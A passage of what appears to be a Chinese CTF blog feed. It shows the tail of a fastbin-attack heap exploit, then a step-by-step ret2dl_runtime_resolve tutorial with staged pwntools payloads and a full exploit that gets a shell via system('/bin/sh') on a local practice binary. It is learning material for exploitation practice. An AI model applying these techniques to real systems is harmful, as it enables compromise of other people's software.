p.recvuntil(&apos;Index: &apos;)</span><br><span class="line">    p.sendline(str(idx))</span><br><span class="line">    p.recvuntil(&apos;Size: &apos;)</span><br><span class="line">    p.sendline(str(size))</span><br><span class="line">    p.recvuntil(&apos;Content: &apos;)</span><br><span class="line">    p.send(content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def free(idx):</span><br><span class="line">    p.recvuntil(&apos;Command: &apos;)</span><br><span class="line">    p.sendline(&apos;3&apos;)</span><br><span class="line">    p.recvuntil(&apos;Index: &apos;)</span><br><span class="line">    p.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def dump(idx):</span><br><span class="line">    p.recvuntil(&apos;Command: &apos;)</span><br><span class="line">    p.sendline(&apos;4&apos;)</span><br><span class="line">    p.recvuntil(&apos;Index: &apos;)</span><br><span class="line">    p.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">allocate(0x10)#0  00</span><br><span class="line">allocate(0x10)#1  20</span><br><span class="line">allocate(0x10)#2  40</span><br><span class="line">allocate(0x10)#3  60</span><br><span class="line">allocate(0x80)#4  80</span><br><span class="line"></span><br><span class="line">free(2)</span><br><span class="line">free(1)</span><br><span class="line"></span><br><span class="line">payload = &apos;a&apos;*0x10 + p64(0) +p64(0x21) + p8(0x80)</span><br><span class="line">fill(0,len(payload),payload)</span><br><span class="line"></span><br><span class="line">payload = &apos;a&apos;*0x10 + p64(0)+ p64(0x21)</span><br><span class="line">fill(3,len(payload),payload)</span><br><span class="line"></span><br><span class="line">allocate(0x10)#1</span><br><span class="line">allocate(0x10)#2 -&gt;4</span><br><span class="line"></span><br><span class="line">payload = &apos;a&apos;*0x10 + p64(0)+ p64(0x91)</span><br><span class="line">fill(3,len(payload),payload)</span><br><span class="line"># gdb.attach(p)</span><br><span class="line">allocate(0x80)#5</span><br><span class="line">free(4)</span><br><span class="line">dump(2)#overlap</span><br><span class="line"></span><br><span class="line">p.recvuntil(&apos;Content: \n&apos;)</span><br><span class="line">main_arena = u64(p.recv(8))-0x58</span><br><span class="line"></span><br><span class="line">print hex(main_arena)</span><br><span class="line">print hex(libc.sym[&apos;__libc_start_main&apos;])</span><br><span class="line"></span><br><span class="line">libc_base = main_arena - 0x3C4B20</span><br><span class="line">#0x7F50FB4A9000‬  </span><br><span class="line"></span><br><span class="line">allocate(0x60)</span><br><span class="line">free(4)</span><br><span class="line"></span><br><span class="line">&apos;&apos;&apos;</span><br><span class="line">0x45216 execve(&quot;/bin/sh&quot;, rsp+0x30, environ)</span><br><span class="line">constraints:</span><br><span class="line">  rax == NULL</span><br><span class="line"></span><br><span class="line">0x4526a execve(&quot;/bin/sh&quot;, rsp+0x30, environ)</span><br><span class="line">constraints:</span><br><span class="line">  [rsp+0x30] == NULL</span><br><span class="line"></span><br><span class="line">0xf02a4 execve(&quot;/bin/sh&quot;, rsp+0x50, environ)</span><br><span class="line">constraints:</span><br><span class="line">  [rsp+0x50] == NULL</span><br><span class="line"></span><br><span class="line">0xf1147 execve(&quot;/bin/sh&quot;, rsp+0x70, environ)</span><br><span class="line">constraints:</span><br><span class="line">  [rsp+0x70] == NULL</span><br><span class="line">&apos;&apos;&apos;</span><br><span class="line">target = main_arena - 0x33 </span><br><span class="line">addr = p64(target)</span><br><span class="line">fill(2,len(addr),addr)</span><br><span class="line">gdb.attach(p)</span><br><span class="line">allocate(0x60)#4</span><br><span class="line">allocate(0x60)#target 6</span><br><span class="line"></span><br><span class="line">onegadget = libc_base + 0x4526a</span><br><span class="line"></span><br><span class="line">payload = &apos;a&apos;*0x13 + p64(onegadget)</span><br><span class="line">fill(6,len(payload),payload)</span><br><span class="line"></span><br><span class="line">allocate(0x100)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>参考链接：<br>        <a href="https://bbs.pediy.com/thread-247214.htm" target="_blank" rel="noopener">https://bbs.pediy.com/thread-247214.htm</a><br>        <a href="https://blog.betamao.me/2018/02/25/hack-lu-ctf-2014-oreo/" target="_blank" rel="noopener">https://blog.betamao.me/2018/02/25/hack-lu-ctf-2014-oreo/</a><br>        <a href="https://bbs.pediy.com/thread-247219-1.htm（师傅写了两个方法，可以看看" target="_blank" rel="noopener">https://bbs.pediy.com/thread-247219-1.htm（师傅写了两个方法，可以看看</a>)</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;就把wiki上的三道题稍微看了一下，了解了一下下fastbin attack，但是。。。依旧不算太清醒&lt;br&gt;好了，废话不多说，开始吧&lt;/p&gt;
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>runtime_resolve</title>
    <link href="http://yoursite.com/2019/10/07/runtime-resolve/"/>
    <id>http://yoursite.com/2019/10/07/runtime-resolve/</id>
    <published>2019-10-07T04:23:05.000Z</published>
    <updated>2019-10-07T06:04:39.138Z</updated>
    
    <content type="html"><![CDATA[<p>做为高级rop的题目果然是令人很头疼的，这类题目是没有办法leak的（无回显），就借助_dl_runtime_resolve(link_map_obj, reloc_index)对动态链接的函数重定位</p><p>控制程序执行 dl_resolve 函数<br>    给定 Link_map 以及 index 两个参数。<br>    当然我们可以直接给定 plt0 对应的汇编代码，这时，我们就只需要一个 index 就足够了。<br>控制 index 的大小，以便于指向自己所控制的区域，从而伪造一个指定的重定位表项。<br>伪造重定位表项，使得重定位表项所指的符号也在自己可以控制的范围内。<br>伪造符号内容，使得符号对应的名称也在自己可以控制的范围内。</p><a id="more"></a><p>对于此类题目：<br>关键点：</p><ol><li>.rel.plt表</li><li>.dynsym</li><li>.dynstr</li><li>从rel.plt里获得某个函数在.dynsym里的偏移</li><li>再从 .dynsym 里获得.dynstr里的偏移</li><li>在 .dynstr里找到对应的字符，将这个字符解析成函数</li></ol><p>然后贴一段我也没有理解的东西看看</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">符号版本信息</span><br><span class="line">    最好使得 ndx = VERSYM[(reloc-&gt;r_info) &gt;&gt; 8] 的值为 0，以便于防止找不到的情况。</span><br><span class="line">重定位表项</span><br><span class="line">r_offset 必须是可写的，因为当解析完函数后，必须把相应函数的地址填入到对应的地址。</span><br></pre></td></tr></table></figure><p>然后参考了很多大佬的博客都提到了延迟绑定机制（就是一定要调用一次之后got表里存的才会是真实地址）<br><img src="/2019/10/07/runtime-resolve/%E5%9B%BE%E7%89%871.png" alt></p><p>第一条的jmp的指令跳转的地址是write的got表地址，但是此时指向的是下一条指令的地址0x80483d6<br><img src="/2019/10/07/runtime-resolve/%E5%9B%BE%E7%89%872.png" alt></p><p>push 0x20 是dl_runtime_resolve的第二个参数（reloc_arg）</p><p>然后跳到plt[0]  (0x8048380) 里，将linkmap  push进去，然后跳到_dl_runtime_resolve进行解析，解析后的地址将会写入到第一次的read  got.plt表里，然后将程序的控制权交给解析出来的地址指向的函数(自动找到那个函数的地址)</p><p>关于四个关键函数的地址提取：<br>plt_0 = elf.get_section_by_name(‘.plt’).header.sh_addr<br>rel_plt = elf.get_section_by_name(‘.rel.plt’).header.sh_addr<br>dynsym = elf.get_section_by_name(‘.dynsym’).header.sh_addr<br>dynstr = elf.get_section_by_name(‘.dynstr’).header.sh_addr</p><p>objdump -s -j .rel.plt babystack<br>objdump -d -j .plt babystack</p><p>（直接找ida来得更快一点）</p><p>readelf -S bof<br><img src="/2019/10/07/runtime-resolve/%E5%9B%BE%E7%89%873.png" alt></p><p>readelf -d bof<br><img src="/2019/10/07/runtime-resolve/%E5%9B%BE%E7%89%874.png" alt></p><p>JMPREL == .rel.plt<br>SYMTAB == .dynsym<br>STRREL == .dynstr<br>plt貌似只有-S里能找到</p><p>readelf -r bof<br><img src="/2019/10/07/runtime-resolve/%E5%9B%BE%E7%89%875.png" alt></p><p>607 -&gt; write的.rel.plt  607&lt;&lt;8 –&gt; 6<br>x/4wx .dynsym的地址+0x10*6    第一个参数是在str里的偏移<br>x/s .str的地址+上面的偏移      得到的是函数名的字符串<br><img src="/2019/10/07/runtime-resolve/%E5%9B%BE%E7%89%876.png" alt><br>x/3i  要查函数的plt表地址<br><img src="/2019/10/07/runtime-resolve/%E5%9B%BE%E7%89%877.png" alt>    </p><p>Jmp –&gt; got表地址<br>Push –&gt; size(0x20) 是dl_runtime_resolve的第二个参数（reloc_arg）<br>Jmp –&gt; plt[0]的地址</p><p>再——link_map = *(GOT+4) == (GOT[1]-&gt;链接器的标识信息)作为参数存入栈中<br>GOT<a href="GOT+8">2</a>是动态链接器的入口点–&gt;存着_dl_runtime_resolve的地址</p><p>_dl_runtime_resolve：完成符号的解析（内部会调用_dl_fixup）（找到真实地址存入got） —— 本题是将write的真实地址写入got，并把控制权交给write</p><p>漏洞利用方式：<br>1、控制eip为plt[0]的地址，只需传入一个index_arg参数即可<br>2、控制index_arg的大小，使reloc的信息存入可控地址<br>3、伪造reloc内容，使sym在可控地址<br>4、伪造sym内容，是name在可控地址<br>5、伪造name为任意库函数，达到我们想要的效果</p><p>我们来分步完成我们想要的效果吧（有write的函数其实就不需要这个方法了吧…）</p><p>Part1：<br>直接用write函数，查看最后输出效果</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">p = process(&apos;./bof&apos;)</span><br><span class="line">elf = ELF(&apos;./bof&apos;)</span><br><span class="line"></span><br><span class="line">rel_plt = 0x08048330</span><br><span class="line">plt_0 = 0x08048380</span><br><span class="line">dynsym = 0x080481d8</span><br><span class="line">dynstr = 0x08048278</span><br><span class="line"></span><br><span class="line">leave_ret = 0x08048458</span><br><span class="line">pop_ebp = 0x0804861b  </span><br><span class="line">ppp_ret = 0x08048619   #pop esi ; pop edi ; pop ebp ; ret</span><br><span class="line"></span><br><span class="line">bss_addr = 0x0804a040 #readelf -S bof | grep &quot;.bss&quot;</span><br><span class="line">stack_size = 0x800</span><br><span class="line">base_stage = bss_addr + stack_size</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">read_plt = elf.plt[&apos;read&apos;]</span><br><span class="line">write_plt = elf.plt[&apos;write&apos;]</span><br><span class="line">write_got = elf.got[&apos;write&apos;]</span><br><span class="line"></span><br><span class="line">fake_sym_addr = base_stage + 36  </span><br><span class="line">align = 0x10 - ((fake_sym_addr - dynsym) &amp; 0xf) </span><br><span class="line">fake_sym_addr = fake_sym_addr + align</span><br><span class="line">index_dynsym = (fake_sym_addr - dynsym) / 0x10  </span><br><span class="line">r_info = index_dynsym &lt;&lt; 8 | 0x7</span><br><span class="line">fake_reloc = p32(write_got) + p32(r_info)  </span><br><span class="line">st_name = fake_sym_addr + 0x10 - dynstr</span><br><span class="line">fake_sym = p32(st_name) + p32(0) + p32(0) + p32(0x12)</span><br><span class="line">index_offset = (base_stage + 28) - rel_plt</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#stage 1   bss_addr</span><br><span class="line">payload = &quot;a&quot;*112 </span><br><span class="line">payload += p32(read_plt) # 读100个字节到base_stage</span><br><span class="line">payload += p32(ppp_ret)</span><br><span class="line">payload += p32(0)</span><br><span class="line">payload += p32(base_stage)</span><br><span class="line">payload += p32(100)</span><br><span class="line">payload += p32(pop_ebp) # 把base_stage pop到ebp中</span><br><span class="line">payload += p32(base_stage)</span><br><span class="line">payload += p32(leave_ret) # mov esp, ebp ; pop ebp ;将esp指向base_stage</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">cmd = &quot;/bin/sh\x00&quot;</span><br><span class="line"></span><br><span class="line">payload1 = &apos;aaaa&apos;</span><br><span class="line">payload1 += p32(write_plt)</span><br><span class="line">payload1 += &apos;aaaa&apos;</span><br><span class="line">payload1 += p32(1)</span><br><span class="line">payload1 += p32(base_stage+80)</span><br><span class="line">payload1 += p32(len(cmd))</span><br><span class="line">payload1 += &apos;A&apos; * (80 - len(payload1))</span><br><span class="line">payload1 += cmd</span><br><span class="line">payload1 += &apos;A&apos; * (100 - len(payload1))</span><br><span class="line">p.sendline(payload1)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>“/bin/sh“被打出来了</p><p><img src="/2019/10/07/runtime-resolve/%E5%9B%BE%E7%89%878.png" alt></p><p>Part 2<br>控制eip为pit[0]地址 </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">cmd = &quot;/bin/sh\x00&quot;</span><br><span class="line">plt_0 = 0x08048380  # objdump -d -j .plt bof</span><br><span class="line">index_offset = 0x20  # write&apos;s index</span><br><span class="line"></span><br><span class="line">payload2 = &apos;aaaa&apos;</span><br><span class="line">payload2 += p32(plt_0)</span><br><span class="line">payload2 += p32(index_offset)</span><br><span class="line">payload2 += &apos;aaaa&apos;</span><br><span class="line">payload2 += p32(1)</span><br><span class="line">payload2 += p32(base_stage + 80)</span><br><span class="line">payload2 += p32(len(cmd))</span><br><span class="line">payload2 += &apos;A&apos; * (80 - len(payload2))</span><br><span class="line">payload2 += cmd </span><br><span class="line">payload2 += &apos;A&apos; * (100 - len(payload2))</span><br><span class="line">p.sendline(payload2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><img src="/2019/10/07/runtime-resolve/%E5%9B%BE%E7%89%879.png" alt></p><p>Part 3<br>控制index_offset 指向fake_reloc</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">cmd = &quot;/bin/sh\x00&quot;</span><br><span class="line">plt_0 = 0x08048380 # objdump -d -j .plt bof</span><br><span class="line">rel_plt = 0x08048330 # objdump -s -j .rel.plt bof</span><br><span class="line">index_offset = (base_stage + 28) - rel_plt # base_stage + 28指向fake_reloc，减去rel_plt即偏移</span><br><span class="line">write_got = elf.got[&apos;write&apos;]</span><br><span class="line">r_info = 0x607 # write: Elf32_Rel-&gt;r_info</span><br><span class="line">fake_reloc = p32(write_got) + p32(r_info)</span><br><span class="line"></span><br><span class="line">payload2 = &apos;aaaa&apos;</span><br><span class="line">payload2 += p32(plt_0)</span><br><span class="line">payload2 += p32(index_offset)</span><br><span class="line">payload2 += &apos;aaaa&apos;</span><br><span class="line">payload2 += p32(1)</span><br><span class="line">payload2 += p32(base_stage + 80)</span><br><span class="line">payload2 += p32(len(cmd))</span><br><span class="line">payload2 += fake_reloc # (base_stage+28)的位置</span><br><span class="line">payload2 += &apos;A&apos; * (80 - len(payload2))</span><br><span class="line">payload2 += cmd </span><br><span class="line">payload2 += &apos;A&apos; * (100 - len(payload2))</span><br><span class="line">p.sendline(payload2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><img src="/2019/10/07/runtime-resolve/%E5%9B%BE%E7%89%8710.png" alt></p><p>Part 4<br>伪造fake_sym  指向st_name</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">cmd = &quot;/bin/sh\x00&quot;</span><br><span class="line">plt_0 = 0x08048380</span><br><span class="line">rel_plt = 0x08048330</span><br><span class="line">index_offset = (base_stage + 28) - rel_plt</span><br><span class="line">write_got = elf.got[&apos;write&apos;]</span><br><span class="line">dynsym = 0x080481d8</span><br><span class="line">dynstr = 0x08048278</span><br><span class="line">fake_sym_addr = base_stage + 36</span><br><span class="line">align = 0x10 - ((fake_sym_addr - dynsym) &amp; 0xf) # 这里的对齐操作是因为dynsym里的Elf32_Sym结构体都是0x10字节大小</span><br><span class="line">fake_sym_addr = fake_sym_addr + align</span><br><span class="line">index_dynsym = (fake_sym_addr - dynsym) / 0x10 # 除以0x10因为Elf32_Sym结构体的大小为0x10，得到write的dynsym索引号</span><br><span class="line">r_info = (index_dynsym &lt;&lt; 8) | 0x7</span><br><span class="line">fake_reloc = p32(write_got) + p32(r_info)</span><br><span class="line">st_name = 0x4c</span><br><span class="line">fake_sym = p32(st_name) + p32(0) + p32(0) + p32(0x12)</span><br><span class="line"></span><br><span class="line">payload2 = &apos;AAAA&apos;</span><br><span class="line">payload2 += p32(plt_0)</span><br><span class="line">payload2 += p32(index_offset)</span><br><span class="line">payload2 += &apos;AAAA&apos;</span><br><span class="line">payload2 += p32(1)</span><br><span class="line">payload2 += p32(base_stage + 80)</span><br><span class="line">payload2 += p32(len(cmd))</span><br><span class="line">payload2 += fake_reloc # (base_stage+28)的位置</span><br><span class="line">payload2 += &apos;B&apos; * align</span><br><span class="line">payload2 += fake_sym # (base_stage+36)的位置</span><br><span class="line">payload2 += &apos;A&apos; * (80 - len(payload2))</span><br><span class="line">payload2 += cmd </span><br><span class="line">payload2 += &apos;A&apos; * (100 - len(payload2))</span><br><span class="line">p.sendline(payload2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><img src="/2019/10/07/runtime-resolve/%E5%9B%BE%E7%89%8711.png" alt></p><p>Part 5<br>St_name指向 ‘write’，继续回显</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">plt_0 = 0x08048380</span><br><span class="line">rel_plt = 0x08048330</span><br><span class="line">index_offset = (base_stage + 28) - rel_plt</span><br><span class="line">write_got = elf.got[&apos;write&apos;]</span><br><span class="line">dynsym = 0x080481d8</span><br><span class="line">dynstr = 0x08048278</span><br><span class="line">fake_sym_addr = base_stage + 36</span><br><span class="line">align = 0x10 - ((fake_sym_addr - dynsym) &amp; 0xf)</span><br><span class="line">fake_sym_addr = fake_sym_addr + align</span><br><span class="line">index_dynsym = (fake_sym_addr - dynsym) / 0x10</span><br><span class="line">r_info = (index_dynsym &lt;&lt; 8) | 0x7</span><br><span class="line">fake_reloc = p32(write_got) + p32(r_info)</span><br><span class="line">st_name = (fake_sym_addr + 0x10) - dynstr # 加0x10因为Elf32_Sym的大小为0x10</span><br><span class="line">fake_sym = p32(st_name) + p32(0) + p32(0) + p32(0x12)</span><br><span class="line"></span><br><span class="line">payload2 = &apos;AAAA&apos;</span><br><span class="line">payload2 += p32(plt_0)</span><br><span class="line">payload2 += p32(index_offset)</span><br><span class="line">payload2 += &apos;AAAA&apos;</span><br><span class="line">payload2 += p32(1)</span><br><span class="line">payload2 += p32(base_stage + 80)</span><br><span class="line">payload2 += p32(len(cmd))</span><br><span class="line">payload2 += fake_reloc # (base_stage+28)的位置</span><br><span class="line">payload2 += &apos;B&apos; * align</span><br><span class="line">payload2 += fake_sym # (base_stage+36)的位置</span><br><span class="line">payload2 += &quot;write\x00&quot;</span><br><span class="line">payload2 += &apos;A&apos; * (80 - len(payload2))</span><br><span class="line">payload2 += cmd </span><br><span class="line">payload2 += &apos;A&apos; * (100 - len(payload2))</span><br><span class="line">p.sendline(payload2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><img src="/2019/10/07/runtime-resolve/%E5%9B%BE%E7%89%8712.png" alt></p><p>Part 6<br>把write改成system来getshell</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">cmd = &quot;/bin/sh\x00&quot;</span><br><span class="line">plt_0 = 0x08048380</span><br><span class="line">rel_plt = 0x08048330</span><br><span class="line">index_offset = (base_stage + 28) - rel_plt</span><br><span class="line">write_got = elf.got[&apos;write&apos;]</span><br><span class="line">dynsym = 0x080481d8</span><br><span class="line">dynstr = 0x08048278</span><br><span class="line">fake_sym_addr = base_stage + 36</span><br><span class="line">align = 0x10 - ((fake_sym_addr - dynsym) &amp; 0xf)</span><br><span class="line">fake_sym_addr = fake_sym_addr + align</span><br><span class="line">index_dynsym = (fake_sym_addr - dynsym) / 0x10</span><br><span class="line">r_info = (index_dynsym &lt;&lt; 8) | 0x7</span><br><span class="line">fake_reloc = p32(write_got) + p32(r_info)</span><br><span class="line">st_name = (fake_sym_addr + 0x10) - dynstr</span><br><span class="line">fake_sym = p32(st_name) + p32(0) + p32(0) + p32(0x12)</span><br><span class="line"></span><br><span class="line">payload2 = &apos;AAAA&apos;</span><br><span class="line">payload2 += p32(plt_0)</span><br><span class="line">payload2 += p32(index_offset)</span><br><span class="line">payload2 += &apos;AAAA&apos;</span><br><span class="line">payload2 += p32(base_stage + 80)</span><br><span class="line">payload2 += &apos;aaaa&apos;</span><br><span class="line">payload2 += &apos;aaaa&apos;</span><br><span class="line">payload2 += fake_reloc # (base_stage+28)的位置</span><br><span class="line">payload2 += &apos;B&apos; * align</span><br><span class="line">payload2 += fake_sym # (base_stage+36)的位置</span><br><span class="line">payload2 += &quot;system\x00&quot;</span><br><span class="line">payload2 += &apos;A&apos; * (80 - len(payload2))</span><br><span class="line">payload2 += cmd</span><br><span class="line">payload2 += &apos;A&apos; * (100 - len(payload2))</span><br><span class="line">p.sendline(payload2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>就可以成功getshell了！！！</p><p><img src="/2019/10/07/runtime-resolve/%E5%9B%BE%E7%89%8713.png" alt></p><p>完整exp</p><figure class="highlight plain"><figcaption><span>python</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">p = process(&apos;./bof&apos;)</span><br><span class="line">elf = ELF(&apos;./bof&apos;)</span><br><span class="line"></span><br><span class="line">rel_plt = 0x08048330</span><br><span class="line">plt_0 = 0x08048380</span><br><span class="line">dynsym = 0x080481d8</span><br><span class="line">dynstr = 0x08048278</span><br><span class="line"></span><br><span class="line">leave_ret = 0x08048458</span><br><span class="line">pop_ebp = 0x0804861b  </span><br><span class="line">ppp_ret = 0x08048619   #pop esi ; pop edi ; pop ebp ; ret</span><br><span class="line"></span><br><span class="line">bss_addr = 0x0804a040 #readelf -S bof | grep &quot;.bss&quot;</span><br><span class="line">stack_size = 0x800</span><br><span class="line">base_stage = bss_addr + stack_size</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">read_plt = elf.plt[&apos;read&apos;]</span><br><span class="line">write_plt = elf.plt[&apos;write&apos;]</span><br><span class="line">write_got = elf.got[&apos;write&apos;]</span><br><span class="line"></span><br><span class="line">fake_sym_addr = base_stage + 36  </span><br><span class="line">align = 0x10 - ((fake_sym_addr - dynsym) &amp; 0xf) </span><br><span class="line">fake_sym_addr = fake_sym_addr + align</span><br><span class="line">index_dynsym = (fake_sym_addr - dynsym) / 0x10  </span><br><span class="line">r_info = index_dynsym &lt;&lt; 8 | 0x7</span><br><span class="line">fake_reloc = p32(write_got) + p32(r_info)  </span><br><span class="line">st_name = fake_sym_addr + 0x10 - dynstr</span><br><span class="line">fake_sym = p32(st_name) + p32(0) + p32(0) + p32(0x12)</span><br><span class="line">index_offset = (base_stage + 28) - rel_plt</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#stage 1   bss_addr</span><br><span class="line">payload = &quot;a&quot;*112 </span><br><span class="line">payload += p32(read_plt) # 读100个字节到base_stage</span><br><span class="line">payload += p32(ppp_ret)</span><br><span class="line">payload += p32(0)</span><br><span class="line">payload += p32(base_stage)</span><br><span class="line">payload += p32(100)</span><br><span class="line">payload += p32(pop_ebp) # 把base_stage pop到ebp中</span><br><span class="line">payload += p32(base_stage)</span><br><span class="line">payload += p32(leave_ret) # mov esp, ebp ; pop ebp ;将esp指向base_stage</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#stage 2   system(&apos;/bin/sh&apos;)</span><br><span class="line">payload2 = &apos;AAAA&apos;</span><br><span class="line">payload2 += p32(plt_0)</span><br><span class="line">payload2 += p32(index_offset)</span><br><span class="line">payload2 += &apos;AAAA&apos;</span><br><span class="line">payload2 += p32(base_stage + 80)</span><br><span class="line">payload2 += &apos;AAAA&apos;</span><br><span class="line">payload2 += &apos;AAAA&apos;</span><br><span class="line">payload2 += fake_reloc # stack_addr+28</span><br><span class="line">payload2 += &apos;A&apos; * align</span><br><span class="line">payload2 += fake_sym # stack_addr+36+align</span><br><span class="line">payload2 += &quot;system\x00&quot;</span><br><span 